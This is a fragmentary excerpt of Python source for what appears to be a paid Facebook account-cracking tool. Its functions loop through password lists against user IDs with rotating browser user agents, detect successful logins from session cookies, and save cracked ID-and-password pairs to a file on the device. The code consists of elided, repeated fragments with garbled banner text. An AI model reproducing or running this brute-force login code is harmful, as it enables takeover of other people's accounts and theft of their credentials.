...
def my_tool_security():
    ...
    print("\t  Fb page  : SAKIBS COMMUNITY ")
    print("\t  Github   : SAKIB48")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=SAKIB"
        print("\n\t     [ Hello User ]\n")
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Sakibbhai123/premium.py/blob/main/Approval.txt').text
...
â•‘ Creator  : MD NAJMUS SAKIB                              â•‘
â•‘ Github   : Sakib  â•‘
â•‘ Facebook : MD NAJMUS SAKIBðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :  PROGGRAMER                             â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
...
def menu_apikey():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100089608626314");xyz()
    elif hamii in ["3","03"]:
        os.system("xdg-open https://wa.me/+8801316165549")
        xyz()    
    elif hamii in ["0","00"]:
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[SAKIB-OK] '+uid+' [âˆš] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[SAKIB] '+uid+' [~] '+ps+' ')
                    open('/sdcard/SAKIB.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[SAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[SAKIB ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[SAKIB ðŸ”¥] [%s] \33[1;97m[OK:%s{SAKIB2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
